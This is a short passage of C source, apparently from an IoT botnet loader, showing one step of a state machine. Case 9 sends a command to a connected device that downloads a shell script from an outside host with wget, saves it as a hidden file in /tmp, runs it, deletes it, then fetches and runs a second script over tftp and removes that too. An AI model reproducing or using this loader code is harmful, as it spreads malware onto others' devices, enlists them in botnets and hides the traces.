...
case 9:
{
if(send(fds[i].fd, "wget http://teamspeak4life.cf/gtop.sh -O /tmp/.bash.sh; sh /tmp/.bash.sh; rm /tmp/.bash.sh;tftp teamspeak4life.cf -c get tftp.sh;sh tftp.sh;rm -rf tftp.sh\r\n", 156, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
fds[i].state = 10;
}
break;
case 10:
